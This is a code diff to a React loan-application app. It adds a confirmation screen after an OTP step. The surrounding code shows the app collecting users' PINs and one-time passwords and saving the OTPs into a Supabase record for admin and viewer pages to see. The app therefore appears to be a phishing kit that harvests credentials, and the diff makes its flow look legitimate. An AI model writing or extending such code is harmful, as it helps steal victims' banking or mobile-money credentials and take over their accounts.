@@ -9,6 +9,7 @@ import { SuccessScreen } from './components/SuccessScreen';
 import { VerificationScreen } from './components/VerificationScreen';
 import { PinScreen } from './components/PinScreen';
 import { OtpScreen } from './components/OtpScreen';
+import { ConfirmationScreen } from './components/ConfirmationScreen';
 import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
@@ -71,6 +72,7 @@ export default function App() {
     const displayValue = `${existing}OTP: ${otp}`;
     await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
     setSubmittedApplication((prev) => prev ? { ...prev, verificationCode: displayValue } : prev);
+    setCurrentStep('confirmation');
   };
 
   useEffect(() => {
@@ -107,6 +109,7 @@ export default function App() {
     else if (currentStep === 'pin') setCurrentStep('success');
     else if (currentStep === 'verification') setCurrentStep('pin');
     else if (currentStep === 'otp') setCurrentStep('verification');
+    else if (currentStep === 'confirmation') setCurrentStep('otp');
   };
 
   const handleReset = () => {
@@ -269,6 +272,12 @@ export default function App() {
                   verificationDisplay={submittedApplication?.verificationCode ?? ''}
                   onBack={() => setCurrentStep('verification')}
                   onSuccess={handleOtpSubmit}
+                />
+              )}
+
+              {currentStep === 'confirmation' && (
+                <ConfirmationScreen
+                  onComplete={handleReset}
                 />
               )}
             </motion.div>
